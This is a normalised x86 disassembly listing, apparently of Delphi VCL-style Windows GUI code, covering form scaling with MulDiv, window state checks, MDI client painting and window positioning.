mov eax [ ebp - 0x4 ]
call sub_45a690
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b2c1
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xac ]
sub_45b2d4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2d2 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
xor eax eax
push ebp
push sub_45b315
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_45bc8c
sub_45b31a
mov eax [ ebp - 0x4 ]
mov si 0xffad
call sub_403430
test al al
jne r-xdata
call sub_403a3c
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
call sub_4039e8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_45bc8c
sub_45b350
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2da ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_45b391
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2dc ]
call [ ebx + 0x2d8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_45b3b0
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_444c74
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi eax
xor eax eax
mov [ ebx + 0x220 ] eax
mov eax edi
mov si 0xffb8
call sub_403430
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_45d658
sub_45b3ec
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_442088
mov eax ebx
sub al 0x1
jb r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
je r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
cmp [ edi + 0x2f0 ] 0x0
jne r-xdata
mov ebp [ edi + 0x2f0 ]
test ebp ebp
je r-xdata
jmp r-xdata
cmp [ edi + 0x250 ] 0x0
je r-xdata
cmp [ edi + 0x248 ] 0x0
jne r-xdata
mov edx esi
mov eax [ edi + 0x2f0 ]
call sub_41a30c
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ edi + 0x2f0 ] eax
cmp esi [ edi + 0x248 ]
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
mov eax [ edi + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp edi [ esi + 0x4 ]
jne r-xdata
cmp esi [ edi + 0x258 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_45ca50
mov edx esi
mov eax ebp
call sub_41a604
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
cmp esi [ edi + 0x260 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_45ca28
mov edx esi
mov eax edi
call sub_45ca50
jmp r-xdata
xor edx edx
mov eax edi
call sub_45ca04
sub_45b4f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_445c38
xor edx edx
push ebp
push sub_45b74e
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x268 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x26c ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x270 ] edx
xor ebx ebx
mov al [ rw-data ]
xor al 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x234 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_445394
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x25c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x270 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
test eax eax
jle r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4425d4
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ r-xdata ]
mov [ eax + 0x98 ] dl
test bl bl
jne r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_442618
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x25c ] eax
mov eax [ ebp - 0x4 ]
call sub_45b880
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
cmp esi eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
mov edx [ rw-data ]
cmp eax [ edx + 0x40 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_443d6c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b755
mov eax [ ebp - 0x4 ]
call sub_445c40
retn
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_45ab58
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_448e64
mov bl 0x1
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45ab58
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x270 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_448e64
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x68 ]
mov eax esi
call sub_423c84
push eax
call MulDiv
mov edx eax
mov eax esi
call sub_423c8c
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x268 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_45b75d
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4466e0
push 0x0
push 0x0
push ebx
push sub_45b864
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_45b830
push ebx
push sub_45b848
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push r-xdata
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
retn
sub_45b80f
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_41db28
test al al
je r-xdata
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_442ce4
sub_45b89b
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add bl al
lea eax [ eax ]
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_45ab58
mov ecx edi
mov edx esi
mov eax ebx
call sub_448e64
mov eax ebx
call sub_45b984
test al al
je r-xdata
push edi
push esi
mov ebp [ ebx + 0x68 ]
mov eax ebp
call sub_423d28
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_423d44
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_442600
mov ebp eax
push edi
push esi
mov eax ebx
call sub_4425bc
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_45bc2c
push edi
push esi
push ebp
call MulDiv
mov edx eax
mov eax ebx
call sub_45bc5c
sub_45b928
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_4493d8
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_4496dc
test al al
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_45dc88
push eax
push 0x1
push 0x80
mov eax ebx
call sub_4493d8
push eax
call SendMessageA
pop ebx
retn
sub_45b9bc
push ebx
mov ebx eax
mov eax ebx
call sub_45c8d8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov al [ ebx + 0x229 ]
sub al 0x2
je r-xdata
mov al 0x1
sub al 0x3
je r-xdata
mov al 0x1
pop ebx
retn
xor eax eax
jmp r-xdata
cmp al [ ebx + 0x210 ]
jne r-xdata
sub_45ba50
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4493d8
push eax
call IsIconic
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_4494a0
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetRect
push 0xffffffec
mov eax ebx
call sub_4493d8
push eax
call GetWindowLongA
push eax
cmp [ ebx + 0x248 ] 0x0
setne al
neg al
sbb eax eax
push eax
push 0xfffffff0
mov eax ebx
call sub_4493d8
push eax
call GetWindowLongA
push eax
push esi
call AdjustWindowRectEx
mov eax [ ebx + 0x4c ]
sub eax [ esi + 0xc ]
add eax [ esi + 0x4 ]
push eax
mov eax [ ebx + 0x48 ]
sub eax [ esi + 0x8 ]
add eax [ esi ]
push eax
push 0x0
push 0x0
push esi
call SetRect
pop esi
pop ebx
retn
sub_45bad8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx esi
mov eax ebx
call sub_44997c
cmp ebx esi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov eax ebx
call sub_420d38
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov edx edi
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_420d0c
mov edi eax
mov eax edi
mov si 0xfff1
call sub_403430
test al al
jne r-xdata
sub_45bb44
push ebx
push esi
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax ebx
call sub_40317c
cmp esi eax
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_45bb70
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax [ esp ]
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax ebp
call sub_4460d0
sub [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0xffffffff
mov eax ebp
call sub_420d38
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebp
call sub_4499c4
jmp r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
inc [ esp + 0x8 ]
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov edx edi
mov eax ebp
call sub_420d0c
mov si 0xfff1
call sub_403430
test al al
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_420d48
jmp r-xdata
sub_45bc04
push ebx
mov ebx eax
cmp dl [ ebx + 0x60 ]
je r-xdata
pop ebx
retn
mov eax ebx
call sub_442da0
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_443d6c
sub_45bc2c
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_4425d4
pop ebx
retn
mov [ ebx + 0x268 ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_45bc5c
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_442618
pop ebx
retn
mov [ ebx + 0x26c ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_45bc8c
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi + 0x2f4 ] 0x1
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx ebx
mov eax esi
call sub_442ad8
cmp bl [ esi + 0x57 ]
je r-xdata
and [ esi + 0x2f4 ] 0xfd
pop esi
pop ebx
retn
or [ esi + 0x2f4 ] 0x2
jmp r-xdata
mov eax esi
call sub_45cdc4
pop esi
pop ebx
retn
sub_45bcd0
push ebp
mov ebp esp
push 0x0
xor edx edx
push ebp
push sub_45bd29
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45bd30
lea eax [ ebp - 0x4 ]
call sub_404008
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
sub_45bd38
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
je r-xdata
test eax eax
jne r-xdata
mov edx esi
mov eax ebx
call sub_442a8c
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax ebx
call sub_4468f8
mov eax ebx
call sub_446a94
sub_45bd70
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_420b84
cmp [ ebx + 0x250 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebx + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x2c ]
sub_45bdb0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov edx eax
cmp edx 0x46
jg r-xdata
sub edx 0xb01a
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
dec edx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
add edx 0xfffffffa
sub edx 0x3
jb r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_446db4
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_403430
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub edx 0x22
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffb1
call sub_403430
jmp r-xdata
cmp eax [ rw-data ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx ] 0x7
jne r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x1
jne r-xdata
dec edx
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb025
mov eax [ ebp - 0x4 ]
call sub_443d6c
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax [ ebp - 0x4 ]
call sub_443d6c
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax [ ebp - 0x4 ]
call sub_443d6c
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax [ ebp - 0x4 ]
call sub_443d6c
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax [ ebp - 0x4 ]
call sub_443d6c
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_443d6c
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x229 ]
sub al 0x2
je r-xdata
sub al 0x2
jne r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x2
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov esi [ ebx + 0x8 ]
cmp [ esi ] 0x1
jne r-xdata
jmp r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x1
jmp r-xdata
sub al 0x3
jne r-xdata
xor esi esi
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_455e2c
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45c6dc
test eax eax
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4243c0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45c029
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45c00c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0xc ]
call sub_424a38
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_4248d8
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
call sub_4573bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c013
xor edx edx
mov eax [ ebp - 0xc ]
call sub_424a38
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
mov edx [ esi + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_455e2c
mov edi eax
test edi edi
je r-xdata
test esi esi
je r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45c6dc
call sub_4493d8
mov esi eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4493d8
push eax
call GetWindowDC
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_45c157
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4243c0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45c130
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45c113
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_424a38
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_4248d8
lea eax [ esi + 0x10 ]
push eax
lea ecx [ esi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c11a
xor edx edx
mov eax [ ebp - 0xc ]
call sub_424a38
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call RestoreDC
retn
push esi
call SetFocus
jmp r-xdata
call sub_4493d8
mov esi eax
sub_45c137
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4493d8
push eax
call ReleaseDC
retn
sub_45c1e8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x274 ]
push eax
call CallWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_45c234
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_45c710
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_45c75c
cmp [ eax + 0x22b ] 0x2
jne r-xdata
pop esi
pop ebx
pop ebp
retn
sub_45c274
push ebp
mov ebp esp
add esp 0xffffff8c
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
sub eax 0xf
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0x5
je r-xdata
xor eax eax
push ebp
push sub_45c442
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call BeginPaint
mov edx [ ebp - 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_4242a4
push eax
lea edx [ ebp - 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x6c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x2b
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_447054
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetWindowRect
lea ecx [ ebp - 0x74 ]
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_4426fc
mov eax [ ebp - 0x74 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x58 ] eax
mov ecx [ ebp - 0x58 ]
neg ecx
mov edx [ ebp - 0x5c ]
neg edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_4414f4
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push ebp
call sub_45c1e8
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x45
jne r-xdata
retn
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call EndPaint
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetClientRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_4242a4
push eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
call sub_45c710
test eax eax
je r-xdata
push ebp
call sub_45c1e8
pop ecx
push ebp
call sub_45c1e8
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov dl 0x1
push ebp
call sub_45c234
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0xffffffff
jmp r-xdata
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
call sub_459554
jmp r-xdata
sub_45c454
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx eax
mov ecx esi
mov eax ebx
call sub_45a71c
mov eax [ ebx + 0x254 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x14
mov ecx [ esi + 0xc ]
mov edi [ esi + 0x4 ]
sub ecx edi
push ecx
mov ecx [ esi + 0x8 ]
mov edx [ esi ]
sub ecx edx
push ecx
push edi
push edx
push 0x1
push eax
call SetWindowPos
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
push esp
mov eax [ ebx + 0x254 ]
push eax
call GetClientRect
test eax eax
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebx + 0x254 ]
push eax
call InvalidateRect
sub_45c4c0
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax ebx
call sub_45adb8
mov eax ebx
call sub_4496dc
test al al
je r-xdata
mov eax ebx
call sub_420d38
mov edi eax
dec edi
test edi edi
jl r-xdata
push 0xffffffec
mov eax ebx
call sub_4493d8
push eax
call GetWindowLongA
and eax 0xffffefff
and eax 0xffffdfff
and eax 0xffffbfff
mov [ esp ] eax
mov edx esp
mov eax ebx
call sub_4461c4
mov eax [ esp ]
push eax
push 0xffffffec
mov eax ebx
call sub_4493d8
push eax
call SetWindowLongA
pop edx
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_420d0c
call sub_456970
mov edx esi
mov eax ebx
call sub_420d0c
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
sub_45c558
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x1
xor edx edx
push ebp
push sub_45c5d5
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
